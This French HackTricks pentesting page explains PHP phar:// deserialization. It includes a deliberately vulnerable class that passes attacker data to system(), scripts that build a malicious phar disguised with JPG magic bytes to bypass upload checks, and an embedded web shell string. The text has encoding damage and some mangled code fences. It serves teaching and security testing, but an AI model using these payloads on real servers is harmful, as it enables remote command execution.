# phar:// dÃ©sÃ©rialisation

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersÃ©curitÃ©** ? Vous voulez voir votre **entreprise annoncÃ©e dans HackTricks** ? ou souhaitez-vous accÃ©der Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dÃ©pÃ´t hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dÃ©pÃ´t hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous Ãªtes intÃ©ressÃ© par une **carriÃ¨re en hacking** et par hacker l'inviolable - **nous recrutons !** (_polonais courant Ã©crit et parlÃ© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

Les fichiers **Phar** (PHP Archive) **contiennent des mÃ©tadonnÃ©es au format sÃ©rialisÃ©**, donc, lorsqu'ils sont analysÃ©s, ces **mÃ©tadonnÃ©es** sont **dÃ©sÃ©rialisÃ©es** et vous pouvez essayer d'exploiter une vulnÃ©rabilitÃ© de **dÃ©sÃ©rialisation** Ã  l'intÃ©rieur du code **PHP**.

Le meilleur aspect de cette caractÃ©ristique est que cette dÃ©sÃ©rialisation se produira mÃªme en utilisant des fonctions PHP qui n'Ã©valuent pas le code PHP comme **file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**.

Imaginez donc une situation oÃ¹ vous pouvez faire en sorte qu'une application web PHP obtienne la taille d'un fichier arbitraire en utilisant le protocole **`phar://`**, et Ã  l'intÃ©rieur du code, vous trouvez une **classe** similaire Ã  la suivante :

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
```php
<?php
class Example {
    public $inject = '<?php system($_GET["cmd"]); ?>';
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Example();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```
{% endcode %}

Vous pouvez crÃ©er un fichier **phar** qui, une fois chargÃ©, **exploitera cette classe pour exÃ©cuter des commandes arbitraires** avec quelque chose comme : 

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
```markdown
{% endcode %}

Notez comment les **octets magiques du JPG** (`\xff\xd8\xff`) sont ajoutÃ©s au dÃ©but du fichier phar pour **contourner** les **restrictions** **possibles** de **tÃ©lÃ©versement** de fichiers.\
**Compilez** le fichier `test.phar` avec :
```
```bash
php --define phar.readonly=0 create_phar.php
```
Et exÃ©cutez la commande `whoami` en abusant du code vulnÃ©rable avec :
```bash
php vuln.php
```
### RÃ©fÃ©rences

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous Ãªtes intÃ©ressÃ© par une **carriÃ¨re en hacking** et par hacker l'inviolable - **nous recrutons !** (_polonais courant Ã©crit et parlÃ© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersÃ©curitÃ©** ? Vous voulez voir votre **entreprise annoncÃ©e dans HackTricks** ? ou vous voulez accÃ©der Ã  la **derniÃ¨re version du PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dÃ©pÃ´t hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dÃ©pÃ´t hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
